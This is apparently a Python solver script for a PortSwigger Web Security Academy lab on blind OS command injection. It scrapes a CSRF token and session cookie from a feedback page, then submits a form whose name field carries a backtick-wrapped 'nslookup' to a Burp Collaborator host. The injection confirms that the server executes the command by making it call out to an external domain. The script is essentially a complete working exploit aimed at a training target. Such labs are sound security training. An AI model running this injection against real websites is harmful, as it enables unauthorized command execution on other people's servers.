############################################################################
#
# Lab: Blind OS command injection with out-of-band interaction
#
# Hack Steps: 
#      1. Fetch the feedback page
#      2. Extract the csrf token and session cookie
#      3. Inject payload into the name field when submitting a feedback to
#         issue a DNS lookup to burp collaborator.
#      4. Check your burp collaborator for the DNS lookup
#
############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a9200f003fe398b8008d6ef004f00bf.web-security-academy.net"

# Change this to your collaborator domain
BURP_COLLABORATOR = "l3ptuqo6ys7gkh7u7yvxb3kqohu8iz6o.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "name")
    print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. ", end="", flush=True)

    feedback_page = fetch("/feedback")   

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = feedback_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", feedback_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Injecting payload to issue a DNS lookup to burp collaborator.. " , end="", flush=True)
   
    payload = f"`nslookup {BURP_COLLABORATOR}`"
    cookies ={ "session": session }
    data = { "csrf": csrf_token, "name": payload, "email": "no@hack.com", "subject": "hacking", "message": "you are hacked" }
    post_data("/feedback/submit", data, cookies)
   
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the DNS lookup")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
